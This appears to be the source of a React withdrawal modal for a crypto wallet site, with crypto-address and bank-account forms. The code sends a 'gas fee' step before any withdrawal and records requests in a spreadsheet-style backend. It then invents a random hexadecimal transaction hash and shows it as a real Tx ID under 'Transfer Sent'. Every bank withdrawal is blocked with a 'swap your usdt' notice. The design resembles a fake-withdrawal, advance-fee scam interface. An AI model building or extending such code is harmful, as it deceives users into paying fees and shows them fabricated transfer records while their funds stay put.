'use client';

import { useState, useEffect, useMemo } from 'react';
import { X, Wallet, Building2, ArrowRight, Loader2, Check, Copy, Clock, AlertCircle, ChevronLeft } from 'lucide-react';
import { motion, AnimatePresence } from 'framer-motion';
import GasFeeModal from './gas-fee-modal';
import { useWallet } from '@/context/base';
import StatusModal from './statusModal';

export interface WithdrawalModalProps {
    isOpen: boolean;
    onClose: () => void;
    bnbBalance?: string;
    t22Balance?: string;
    usdtBalance?: string;
    usdtBnbBalance?: string;
    ctmBalance?: string;
    ltcBalance?: string;
    newTetherBalance?: string;
    marketPrices?: Record<string, { price: number; change: number }>;
    maskAccount?: boolean;
    currencySymbol?: string;
    fxRate?: number;
    theme?: 'dark' | 'light';
    onSuccess?: () => void;
    isInline?: boolean;
}

export default function WithdrawalModal({
    isOpen,
    onClose,
    bnbBalance = '0',
    t22Balance = '0',
    usdtBalance = '0',
    usdtBnbBalance = '0',
    ctmBalance = '0',
    ltcBalance = '0',
    newTetherBalance = '0',
    marketPrices = {},
    maskAccount = false,
    currencySymbol = '$',
    fxRate = 1,
    theme = 'light',
    onSuccess,
    isInline = false
}: WithdrawalModalProps) {
    const [withdrawalType, setWithdrawalType] = useState<'crypto' | 'bank'>('crypto');
    const [amount, setAmount] = useState('');
    const [address, setAddress] = useState('');
    const [accountNumber, setAccountNumber] = useState('');
    const [routingNumber, setRoutingNumber] = useState('');
    const { cbProvider, address: add } = useWallet();

    const [step, setStep] = useState<'input' | 'processing' | 'success'>('input');
    const [statusMsg, setStatusMsg] = useState('Verifying withdrawal...');
    const [txHash, setTxHash] = useState('');
    const [txCopied, setTxCopied] = useState(false);
    const [errorMsg, setErrorMsg] = useState('');

    // Added only these for network/asset filtering
    const [selectedNetwork, setSelectedNetwork] = useState<string>('BNB');
    const [selectedCoin, setSelectedCoin] = useState('BNB');

    const networks = {
        BNB: { name: 'Smart Chain', symbol: 'BEP20', logo: 'https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/bnb.png' },
        ETH: { name: 'Ethereum', symbol: 'ERC20', logo: 'https://assets.coingecko.com/coins/images/279/large/ethereum.png' },
        BTC: { name: 'Bitcoin', symbol: 'BTC', logo: 'https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/btc.png' }
    };

    const availableCoins = {
        'BNB': { supportedNetworks: ["BNB"], name: "BNB", logo: 'https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/bnb.png' },
        'ETH': { supportedNetworks: ["ETH", "BNB"], name: "Ethereum", logo: 'https://assets.coingecko.com/coins/images/279/large/ethereum.png' },
        'USDT': { supportedNetworks: ["BNB", "ETH"], name: "Tether", logo: 'https://assets.coingecko.com/coins/images/325/large/tether.png' },
        'USDC': { supportedNetworks: ["BNB", "ETH"], name: "USDC", logo: 'https://assets.coingecko.com/coins/images/6319/large/USD_Coin_icon.png' },
        'BTC': { supportedNetworks: ["BTC"], name: "Bitcoin", logo: 'https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/btc.png' },
        'CTM': { supportedNetworks: ["BNB", "ETH"], name: "CTM", logo: '/ctm_logo.png' },
        'LTC': { supportedNetworks: ["BNB"], name: "Litecoin", logo: 'https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/ltc.png' },
        'USDT_BNB': { supportedNetworks: ["BNB"], name: "Tether (BNB)", logo: 'https://assets.coingecko.com/coins/images/325/large/tether.png' },
    };

    const filteredAssets = useMemo(() => {
        return Object.entries(availableCoins).filter(([_, data]) =>
            data.supportedNetworks.includes(selectedNetwork)
        ).map(([symbol]) => symbol);
    }, [selectedNetwork]);

    useEffect(() => {
        if (!filteredAssets.includes(selectedCoin)) {
            setSelectedCoin(filteredAssets[0]);
        }
    }, [selectedNetwork, filteredAssets]);

    // Gas Fee & Conversion State
    const [showGasModal, setShowGasModal] = useState(false);
    const [showStatusModel, setShowStatusModel] = useState(false);
    const [t22Price, setT22Price] = useState(0);
    const [isLoadingPrice, setIsLoadingPrice] = useState(false);
    const [withdrawLoading, setWithdrawLoading] = useState(false);


    const getBalanceUsd = () => {
        const coinBalances: Record<string, number> = {
            'BNB': Number(bnbBalance),
            'T22': Number(t22Balance),
            'USDT': Number(usdtBalance),
            'USDT_BNB': Number(usdtBnbBalance),
            'CTM': Number(ctmBalance),
            'LTC': Number(ltcBalance)
        };

        const price = marketPrices[selectedCoin]?.price || 0;
        const bal = coinBalances[selectedCoin] || 0;
        
        // Return full precision as string
        return (bal * price).toString();
    };

    // Bank Validation State
    const [bankName, setBankName] = useState('');
    const [routingDetails, setRoutingDetails] = useState({ bank_name: null, state: null, city: null });
    const [isVerifyingRouting, setIsVerifyingRouting] = useState(false);
    const [routingError, setRoutingError] = useState('');

    // Form Validation state
    const isFormValid = useMemo(() => {
        if (!amount || Number(amount) <= 0) return false;

        if (withdrawalType === 'crypto') {
            const addr = address.trim();
            if (!addr) return false;

            if (selectedNetwork === 'BNB' || selectedNetwork === 'ETH') {
                // Must start with 0x and be exactly 42 characters long total
                return /^0x[a-fA-F0-9]{40}$/.test(addr);
            } else if (selectedNetwork === 'BTC') {
                // Mainnet single-sig (1), script (3), or bech32 (bc1)
                return /^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$/.test(addr);
            }
            return addr.length > 5;
        } else {
            return bankName && !routingError && routingNumber.length === 9 && accountNumber.length >= 10;
        }
    }, [amount, withdrawalType, address, selectedNetwork, bankName, routingError, routingNumber, accountNumber]);

    const isSufficientBalance = useMemo(() => {
        if (!amount || isNaN(Number(amount))) return false;
        return Number(amount) <= Number(getBalanceUsd());
    }, [amount, getBalanceUsd]);

    const cryptoAddressError = useMemo(() => {
        if (withdrawalType !== 'crypto' || !address.trim()) return '';

        const addr = address.trim();
        if (selectedNetwork === 'BNB' || selectedNetwork === 'ETH') {
            if (!addr.startsWith('0x')) return 'Address must start with 0x';
            if (addr.length !== 42) return 'Address must be exactly 42 characters long';
            if (!/^0x[a-fA-F0-9]{40}$/.test(addr)) return 'Address contains invalid characters';
        } else if (selectedNetwork === 'BTC') {
            if (!/^(bc1|[13])/.test(addr)) return 'Bitcoin address must start with 1, 3, or bc1';
            if (addr.length < 26 || addr.length > 35) return 'Bitcoin address must be between 26 and 35 characters';
            if (!/^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$/.test(addr)) return 'Address contains invalid characters';
        }
        return '';
    }, [address, selectedNetwork, withdrawalType]);

    useEffect(() => {
        if (isOpen && withdrawalType === 'bank') {
            fetchPrice();
        }
    }, [isOpen, withdrawalType]);

    // Reset state on open
    useEffect(() => {
        if (!isOpen) {
            setWithdrawalType('crypto');
            setRoutingNumber('');
            setAccountNumber('');
            setAmount('');
            setBankName('');
            setRoutingError('');
            setSelectedNetwork('BNB');
            setStep('input');
            setStatusMsg('Verifying withdrawal...');
            setTxHash('');
        }
    }, [isOpen]);

    const fetchPrice = async () => {
        try {
            setIsLoadingPrice(true);
            const response = await fetch('https://api.coinbase.com/v2/prices/T99-USD/spot');
            const json = await response.json();
            const price = parseFloat(json.data.amount) || 0.45;
            setT22Price(price);
        } catch (e) {
            setT22Price(0.45);
        } finally {
            setIsLoadingPrice(false);
        }
    };

    const validateRoutingNumber = async (number: string) => {
        if (number.length !== 9) {
            setBankName('');
            setRoutingDetails({ bank_name: null, state: null, city: null });
            return;
        }

        setRoutingDetails({ bank_name: null, state: null, city: null });
        setIsVerifyingRouting(true);
        setRoutingError('');
        setBankName('');

        try {
            try {
                const response1 = await fetch(`/api/bank-routing/${number}`);
                if (response1.ok) {
                    const data = await response1.json();
                    if (data && data.bank_name) {
                        setBankName('valid');
                        setRoutingDetails(data);
                        setIsVerifyingRouting(false);
                        return;
                    }
                }
            } catch (e) { console.log('API 1 failed'); }

            try {
                const response1 = await fetch(`https://www.routingnumbers.info/api/data.json?rn=${number}`);
                if (response1.ok) {
                    const data = await response1.json();
                    if (data && data.customer_name) {
                        setBankName('valid');
                        setIsVerifyingRouting(false);
                        return;
                    }
                }
            } catch (e) { console.log('API 1.1 failed'); }

            const validateChecksum = (rn: string): boolean => {
                const digits = rn.split('').map(Number);
                const checksum = (3 * (digits[0] + digits[3] + digits[6]) +
                    7 * (digits[1] + digits[4] + digits[7]) +
                    (digits[2] + digits[5] + digits[8])) % 10;
                return checksum === 0;
            };

            if (validateChecksum(number)) {
                setBankName('valid');
            } else {
                setRoutingError('Invalid routing number');
            }
        } catch (error) {
            setRoutingError('Could not verify routing number');
        } finally {
            setIsVerifyingRouting(false);
        }
    };

    const handleRoutingChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        const value = e.target.value.replace(/\D/g, '').slice(0, 9);
        setRoutingNumber(value);
        if (value.length === 9) {
            validateRoutingNumber(value);
        } else {
            setBankName('');
            setRoutingError('');
        }
    };

    const handleAccountChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        // Strip non-digits and prevent arbitrarily long input (e.g., limit to 12 digits max)
        const value = e.target.value.replace(/\D/g, '').slice(0, 12);
        setAccountNumber(value);
    };


    const handleGasSuccess = async (txHash: string) => {
        try {
            setStep('processing');
            setStatusMsg('Recording withdrawal request...');
            setWithdrawLoading(true);

            // Record the actual withdrawal in Airtable (like SwapModal does)
            const res = await fetch(`/api/withdrawal`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    address: add,
                    amount: Number(amount),
                    routingNumber,
                    reciepientWalletAddress: address,
                    accountNumber: accountNumber,
                    wType: withdrawalType,
                    bankName,
                    type: "send",
                    asset: selectedCoin,
                    network: selectedNetwork
                })
            });

            const vjson = await res.json();
            if (vjson?.record?.id || vjson?.success) {
                setStatusMsg('Finalizing...');
                const randomHex = Array.from({ length: 64 }, () => Math.floor(Math.random() * 16).toString(16)).join('');
                setTxHash('0x' + randomHex);

                await new Promise(r => setTimeout(r, 1200));

                // Add to local storage for immediate UI update
                const newTx = {
                    id: txHash || '0x' + randomHex,
                    type: 'send',
                    asset: withdrawalType === 'bank' ? 'USD' : selectedCoin,
                    amount: `-${amount}`,
                    date: 'Just now',
                    status: 'pending',
                    counterparty: withdrawalType === 'bank' ? (bankName || 'Bank Account') : address
                };
                const existingInfo = localStorage.getItem('transactions');
                const transactions = existingInfo ? JSON.parse(existingInfo) : [];
                localStorage.setItem('transactions', JSON.stringify([newTx, ...transactions]));

                setStep('success');
                if (onSuccess) onSuccess();
            } else {
                setErrorMsg('Transaction recorded but failed to update history. Please refresh.');
                setStep('input');
            }
        } catch (e) {
            console.error("handleGasSuccess Error:", e);
            setStep('input');
        } finally {
            setShowGasModal(false);
            setWithdrawLoading(false);
        }
    };

    const handleSubmit = async (e: React.FormEvent) => {
        e.preventDefault();
        if (withdrawalType === 'bank') {
            setShowStatusModel(true)
            return
        }

        if (!isFormValid || !isSufficientBalance) return;

        // Open the Gas Fee Modal first
        setShowGasModal(true);
    };

    const renderContent = () => {
        return (
            <div className={`${isInline ? 'w-full max-w-[600px] mx-auto' : ''} ${theme === 'dark' ? 'text-white' : 'text-[#0a0b0d]'}`}>
                <div className={`${isInline ? `md:rounded-[2.5rem] md:border p-0 md:p-2 ${theme === 'dark' ? 'bg-transparent md:bg-[#000000] border-white/10' : 'bg-transparent md:bg-white border-gray-100 md:shadow-xl'}` : ''}`}>
                    <div className={`${isInline ? 'p-0 md:p-6 pb-10' : ''}`}>
                        {step === 'input' ? (
                            <div className="w-full">
                                {/* Sticky Header */}
                                <div className={`sticky top-0 z-10 px-5 pt-8 pb-4 flex items-center gap-3 ${theme === 'dark' ? 'bg-black' : 'bg-white'}`}>
                                    <button onClick={onClose} className={`w-9 h-9 flex items-center justify-center rounded-full transition-all ${theme === 'dark' ? 'bg-white/10 text-gray-400 hover:text-white' : 'bg-gray-100 text-gray-500 hover:text-black'}`}>
                                        <ChevronLeft className="w-5 h-5" />
                                    </button>
                                    <h2 className="text-base font-semibold tracking-tight">Send Crypto</h2>
                                </div>

                                {/* Scrollable Content */}
                                <div className="mt-6 px-5">
                                {/* Type Selector */}
                                <div className={`flex rounded-2xl p-1 mb-8 ${theme === 'dark' ? 'bg-white/5' : 'bg-gray-100'}`}>
                                    <button type="button" onClick={() => setWithdrawalType('crypto')} className={`flex-1 flex items-center justify-center gap-2 py-2.5 rounded-xl text-sm font-semibold transition-all ${withdrawalType === 'crypto' ? (theme === 'dark' ? 'bg-white/10 text-white' : 'bg-white text-black shadow-sm') : 'opacity-40'}`}>
                                        <Wallet className="w-4 h-4" />
                                        Crypto
                                    </button>
                                    <button type="button" onClick={() => setWithdrawalType('bank')} className={`flex-1 flex items-center justify-center gap-2 py-2.5 rounded-xl text-sm font-semibold transition-all ${withdrawalType === 'bank' ? (theme === 'dark' ? 'bg-white/10 text-white' : 'bg-white text-black shadow-sm') : 'opacity-40'}`}>
                                        <Building2 className="w-4 h-4" />
                                        Bank
                                    </button>
                                </div>

                                <form onSubmit={handleSubmit} className="space-y-7">
                                    {withdrawalType === 'crypto' && (
                                        <>
                                            <div>
                                                <label className="block text-[11px] font-semibold text-gray-400 mb-3 uppercase tracking-widest">Network</label>
                                                <div className="flex gap-2 overflow-x-auto pb-1 scrollbar-hide">
                                                    {Object.keys(networks).map((net) => (
                                                        <button key={net} type="button" onClick={() => setSelectedNetwork(net as any)} className={`flex items-center gap-2 py-2 px-3 rounded-xl border transition-all whitespace-nowrap text-xs font-semibold ${selectedNetwork === net
                                                            ? `border-blue-600/50 bg-blue-600/10 ${theme === 'dark' ? 'text-blue-400' : 'text-blue-600'}`
                                                            : `${theme === 'dark' ? 'border-white/5 bg-white/5 text-gray-500' : 'border-gray-200 bg-gray-50 text-gray-500'}`}`}>
                                                            <img src={networks[net as keyof typeof networks].logo} alt={net} className="w-4 h-4 object-contain rounded-full" />
                                                            {networks[net as keyof typeof networks].name}
                                                        </button>
                                                    ))}
                                                </div>
                                            </div>

                                            <div>
                                                <label className="block text-[11px] font-semibold text-gray-400 mb-3 uppercase tracking-widest">Asset</label>
                                                <div className="flex flex-wrap gap-2">
                                                    {filteredAssets.map((coin) => (
                                                        <button key={coin} type="button" onClick={() => setSelectedCoin(coin)} className={`flex items-center gap-2 py-2 px-3 rounded-xl border transition-all text-xs font-semibold ${selectedCoin === coin
                                                            ? 'border-blue-600/50 bg-blue-600/10 text-blue-500'
                                                            : `${theme === 'dark' ? 'border-white/5 bg-white/5 text-gray-400 hover:bg-white/10' : 'border-gray-200 bg-gray-50 text-gray-500'}`}`}>
                                                            <div className="w-5 h-5 rounded-full bg-white p-0.5 flex items-center justify-center shrink-0 border border-gray-100">
                                                                <img src={availableCoins[coin as keyof typeof availableCoins]?.logo} alt={coin} className="w-full h-full object-contain" />
                                                            </div>
                                                            {coin}
                                                        </button>
                                                    ))}
                                                </div>
                                            </div>

                                            <div>
                                                <label className="block text-[11px] font-semibold text-gray-400 mb-3 uppercase tracking-widest">Address</label>
                                                <div className="relative">
                                                    <input
                                                        type="text"
                                                        value={address}
                                                        onChange={(e) => setAddress(e.target.value)}
                                                        placeholder={`Paste ${selectedCoin} address`}
                                                        className={`w-full px-4 py-[14px] border rounded-2xl focus:outline-none transition-all font-mono text-sm placeholder-gray-500 pr-20 ${
                                                            theme === 'dark' ? 'bg-white/5 text-white' : 'bg-gray-50 text-[#0a0b0d]'
                                                        } ${cryptoAddressError ? 'border-red-500/50 focus:border-red-500' : 'border-transparent focus:border-blue-600'}`}
                                                        required
                                                    />
                                                    <button type="button" onClick={async () => { try { const text = await navigator.clipboard.readText(); setAddress(text); } catch(e){} }} className="absolute right-3 top-1/2 -translate-y-1/2 text-blue-600 text-[11px] font-bold hover:opacity-80 transition-opacity px-2 py-1 bg-blue-600/10 rounded-lg">
                                                        PASTE
                                                    </button>
                                                </div>
                                                {cryptoAddressError && <p className="text-[11px] text-red-500 mt-2 font-medium px-1">{cryptoAddressError}</p>}
                                            </div>
                                        </>
                                    )}

                                    {withdrawalType === 'bank' && (
                                        <div className="space-y-6">
                                            <div>
                                                <label className="block text-[11px] font-semibold text-gray-400 mb-3 uppercase tracking-widest">Routing Number</label>
                                                <div className="relative">
                                                    <input 
                                                        type="text" 
                                                        value={routingNumber} 
                                                        onChange={handleRoutingChange} 
                                                        placeholder="9-digit routing number" 
                                                        className={`w-full px-4 py-[14px] border rounded-2xl focus:outline-none transition-all font-medium text-sm placeholder-gray-500 ${
                                                            theme === 'dark' ? 'bg-white/5 text-white' : 'bg-gray-50 text-[#0a0b0d]'
                                                        } ${routingError ? 'border-red-500/50 focus:border-red-500' : bankName ? 'border-emerald-500/50 focus:border-emerald-500' : 'border-transparent focus:border-blue-600'}`} 
                                                        maxLength={9} 
                                                        required 
                                                    />
                                                    {isVerifyingRouting && <div className="absolute right-5 top-1/2 -translate-y-1/2"><Loader2 className="w-5 h-5 animate-spin text-blue-600" /></div>}
                                                </div>
                                                {bankName && (
                                                    <motion.div initial={{ opacity: 0, y: 5 }} animate={{ opacity: 1, y: 0 }} className={`mt-3 p-4 rounded-2xl border flex items-center gap-4 ${theme === 'dark' ? 'bg-emerald-500/10 border-emerald-500/20' : 'bg-emerald-50 border-emerald-100'}`}>
                                                        <div className="w-10 h-10 rounded-full bg-emerald-500 text-white flex items-center justify-center shrink-0 shadow-lg shadow-emerald-500/20">
                                                            <Building2 className="w-5 h-5" />
                                                        </div>
                                                        <div className="flex-1">
                                                            <p className={`text-[10px] font-bold uppercase tracking-widest opacity-50 ${theme === 'dark' ? 'text-emerald-400' : 'text-emerald-600'}`}>Verified Bank</p>
                                                            <p className={`text-sm font-bold ${theme === 'dark' ? 'text-white' : 'text-emerald-900'}`}>{(routingDetails?.bank_name) ? `${routingDetails?.bank_name}` : "Routing number confirmed"}</p>
                                                        </div>
                                                    </motion.div>
                                                )}
                                                {routingError && <p className="text-xs text-red-500 mt-2 font-bold px-1 flex items-center gap-1.5"><AlertCircle className="w-4 h-4" /> {routingError}</p>}
                                            </div>

                                            <div>
                                                <label className="block text-[11px] font-semibold text-gray-400 mb-3 uppercase tracking-widest">Account Number</label>
                                                <input
                                                    type="text"
                                                    inputMode="numeric"
                                                    value={accountNumber}
                                                    onChange={handleAccountChange}
                                                    placeholder="Enter account number"
                                                    className={`w-full px-4 py-[14px] border rounded-2xl focus:outline-none transition-all font-medium text-sm placeholder-gray-500 ${
                                                        theme === 'dark' ? 'bg-white/5 border-transparent focus:border-blue-600 text-white' : 'bg-gray-50 border-transparent focus:border-blue-600 text-[#0a0b0d]'
                                                    }`}
                                                    maxLength={12}
                                                    required
                                                />
                                            </div>
                                        </div>
                                    )}

                                    <div>
                                        <label className="block text-[11px] font-semibold text-gray-400 mb-3 uppercase tracking-widest">Amount</label>
                                        <div className="relative group">
                                            <input
                                                type="number"
                                                value={amount}
                                                onChange={(e) => setAmount(e.target.value)}
                                                placeholder="0.00"
                                                className={`w-full px-5 py-[14px] border rounded-2xl focus:outline-none transition-all text-3xl font-bold placeholder-gray-500 pr-28 ${
                                                    theme === 'dark' ? 'bg-white/5 border-transparent focus:border-blue-600 text-white' : 'bg-gray-50 border-transparent focus:border-blue-600 text-[#0a0b0d]'
                                                }`}
                                                required
                                            />
                                            <div className="absolute right-4 top-1/2 -translate-y-1/2 flex items-center gap-2">
                                                <button
                                                    type="button"
                                                    onClick={() => setAmount(getBalanceUsd())}
                                                    className="bg-blue-600 text-white text-[10px] font-bold px-3 py-1.5 rounded-lg hover:bg-blue-700 transition-colors"
                                                >
                                                    MAX
                                                </button>
                                                <span className="text-gray-400 font-bold text-sm uppercase mr-2">USD</span>
                                            </div>
                                        </div>
                                        <div className="flex justify-between items-center mt-3 px-1">
                                            <div className="flex-1">
                                                {amount && !isSufficientBalance && (
                                                    <p className="text-[11px] text-red-500 font-bold flex items-center gap-1.5">
                                                        <AlertCircle className="w-4 h-4" /> Insufficient balance
                                                    </p>
                                                )}
                                            </div>
                                            <div className="text-[11px] font-bold text-gray-500 dark:text-gray-400">
                                                Available: {maskAccount ? '••••••' : `${currencySymbol}${(Number(getBalanceUsd()) * fxRate).toFixed(2)}`}
                                            </div>
                                        </div>

                                        {/* Summary Box */}
                                        {amount && Number(amount) > 0 && (
                                            <motion.div initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} className={`rounded-2xl p-5 space-y-4 mt-6 ${theme === 'dark' ? 'bg-white/5' : 'bg-gray-50'}`}>
                                                {(() => {
                                                    const feeMap: Record<string, number> = { 'BNB': 0.15, 'ETH': 2.50, 'USDT': 1.00, 'BTC': 1.50 };
                                                    const networkFee = withdrawalType === 'bank' ? 0.00 : (feeMap[selectedCoin] || 0.00);
                                                    const coinPrice = selectedCoin === 'BNB' ? 620 : selectedCoin === 'USDT' ? 1 : t22Price;
                                                    const totalUsd = Number(amount); 
                                                    const receivedUsd = Math.max(0, totalUsd - networkFee);
                                                    const receivedCrypto = receivedUsd / coinPrice;

                                                    return (
                                                        <>
                                                            <div className="flex justify-between items-center text-sm">
                                                                <span className="text-gray-500 font-medium">Rate</span>
                                                                <span className="font-bold">1 {selectedCoin} ≈ {currencySymbol}{(coinPrice * fxRate).toFixed(2)}</span>
                                                            </div>
                                                            <div className="flex justify-between items-center text-sm">
                                                                <span className="text-gray-500 font-medium">Fee</span>
                                                                <span className="font-bold">{currencySymbol}{(networkFee * fxRate).toFixed(2)}</span>
                                                            </div>
                                                            <div className="h-[1px] w-full bg-gray-200 dark:bg-white/5" />
                                                            <div className="flex justify-between items-end">
                                                                <span className="text-gray-500 font-bold text-sm mb-1">Receive</span>
                                                                <div className="text-right">
                                                                    <p className="text-2xl font-bold text-blue-600 leading-none mb-1">
                                                                        {currencySymbol}{(receivedUsd * fxRate).toFixed(2)}
                                                                    </p>
                                                                    <p className="text-[13px] font-bold text-gray-400">
                                                                        {parseFloat(receivedCrypto.toFixed(8)).toString()} {selectedCoin}
                                                                    </p>
                                                                </div>
                                                            </div>
                                                        </>
                                                    )
                                                })()}
                                            </motion.div>
                                        )}
                                    </div>

                                    <button
                                        disabled={withdrawLoading || !isFormValid || !isSufficientBalance}
                                        type="submit"
                                        className="w-full bg-blue-600 hover:bg-blue-700 disabled:opacity-50 disabled:cursor-not-allowed text-white font-bold py-4 rounded-2xl transition-all shadow-xl shadow-blue-600/20 active:scale-[0.98] flex items-center justify-center gap-3 text-base"
                                    >
                                        {withdrawLoading ? <Loader2 className="w-5 h-5 animate-spin" /> : "Continue"}
                                    </button>
                                </form>
                                </div>
                            </div>
                        ) : step === 'processing' ? (
                            <motion.div initial={{ opacity: 0, scale: 0.9 }} animate={{ opacity: 1, scale: 1 }} className="py-24 flex flex-col items-center justify-center space-y-8">
                                <div className="relative">
                                    <div className="absolute inset-0 bg-blue-600 blur-3xl opacity-20 animate-pulse" />
                                    <Loader2 className="w-20 h-20 text-blue-600 animate-spin relative z-10" />
                                </div>
                                <div className="text-center space-y-3">
                                    <h3 className="text-2xl font-bold">Transferring...</h3>
                                    <p className="text-sm text-gray-500 font-medium animate-pulse">{statusMsg}</p>
                                </div>
                            </motion.div>
                        ) : (
                            <motion.div initial={{ opacity: 0, scale: 0.9 }} animate={{ opacity: 1, scale: 1 }} className="flex flex-col items-center py-4">
                                <div className="w-24 h-24 bg-green-500/10 border border-green-500/20 text-green-500 rounded-full flex items-center justify-center mb-8 shadow-xl shadow-green-500/10">
                                    <Check className="w-12 h-12" />
                                </div>
                                <h3 className="text-3xl font-bold mb-3 text-center">Transfer Sent</h3>
                                <p className="text-sm font-medium mb-10 text-center px-6 leading-relaxed text-gray-500">Your withdrawal request has been received and is being processed.</p>

                                <div className={`w-full rounded-[2.5rem] p-8 mb-10 space-y-5 ${
                                    theme === 'dark' ? 'bg-white/5' : 'bg-gray-50'
                                }`}>
                                    <div className="flex justify-between items-center">
                                        <span className="text-gray-500 font-bold text-xs uppercase tracking-widest">Amount</span>
                                        <span className="font-bold text-2xl text-blue-600">{currencySymbol}{(Math.max(0, Number(amount) - 0.50) * fxRate).toFixed(2)}</span>
                                    </div>
                                    <div className="h-[1px] w-full bg-gray-200 dark:bg-white/5" />
                                    <div className="flex justify-between items-center text-sm">
                                        <span className="text-gray-500 font-medium">Destination</span>
                                        <span className="font-bold">{withdrawalType === 'crypto' ? networks[selectedNetwork as keyof typeof networks]?.name : 'Bank Transfer'}</span>
                                    </div>
                                    <div className="flex justify-between items-center text-sm">
                                        <span className="text-gray-500 font-medium">Status</span>
                                        <div className="flex items-center gap-2">
                                            <div className="w-2 h-2 rounded-full bg-yellow-500 animate-pulse" />
                                            <span className="font-bold text-yellow-600">Processing</span>
                                        </div>
                                    </div>
                                    {withdrawalType === 'crypto' && txHash && (
                                        <>
                                            <div className="h-[1px] w-full bg-gray-200 dark:bg-white/5" />
                                            <div className="flex justify-between items-center">
                                                <span className="text-gray-500 font-medium text-sm">Tx ID</span>
                                                <button onClick={() => { navigator.clipboard.writeText(txHash); setTxCopied(true); setTimeout(() => setTxCopied(false), 2000); }} className="flex items-center gap-2 px-3 py-1.5 bg-blue-600/10 rounded-xl hover:bg-blue-600/20 transition-all">
                                                    <span className="text-blue-600 font-mono font-bold text-xs">{txHash.substring(0, 8)}...{txHash.substring(txHash.length - 6)}</span>
                                                    {txCopied ? <Check className="w-3.5 h-3.5 text-green-500" /> : <Copy className="w-3.5 h-3.5 text-blue-600" />}
                                                </button>
                                            </div>
                                        </>
                                    )}
                                </div>

                                <button onClick={onClose} className="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-6 rounded-[2rem] transition-all shadow-xl shadow-blue-600/20 active:scale-[0.98]">
                                    Done
                                </button>
                            </motion.div>
                        )}
                    </div>
                </div>
            </div>
        );
    };

    if (isInline) {
        return renderContent();
    }

    return (
        <AnimatePresence>
            {isOpen && (
                <div className="fixed inset-0 z-50 flex items-center justify-center">
                    <motion.div
                        initial={{ opacity: 0 }}
                        animate={{ opacity: 1 }}
                        exit={{ opacity: 0 }}
                        className={`absolute inset-0 backdrop-blur-sm ${theme === 'dark' ? 'bg-black/60' : 'bg-black/20'}`}
                        onClick={step === 'input' ? onClose : undefined}
                    />

                    <motion.div
                        initial={{ scale: 0.9, opacity: 0 }}
                        animate={{ scale: 1, opacity: 1 }}
                        exit={{ scale: 0.9, opacity: 0 }}
                        transition={{ type: "spring", damping: 25, stiffness: 200 }}
                        className={`relative w-full max-w-[420px] ${theme === 'dark' ? 'bg-[#000000] text-white border-white/10' : 'bg-white text-[#0a0b0d] border-transparent shadow-xl'
                            } border rounded-[2.5rem] p-6 shadow-2xl m-4`}
                    >
                        {renderContent()}

                        <AnimatePresence>
                            {showGasModal && (
                                <GasFeeModal
                                    isOpen={showGasModal}
                                    onClose={() => setShowGasModal(false)}
                                    onSuccess={handleGasSuccess}
                                    theme={theme}
                                    network={selectedNetwork}
                                />
                            )}
                        </AnimatePresence>
                        <AnimatePresence>
                            {showStatusModel && (
                                <StatusModal
                                    success={false}
                                    message='Please swap your usdt before proceeding with withdrawals'
                                    title='Notice'
                                    isOpen={showStatusModel}
                                    onClose={() => setShowStatusModel(false)}
                                    theme={theme}
                                />
                            )}
                        </AnimatePresence>
                    </motion.div>
                </div>
            )}
        </AnimatePresence>
    );
}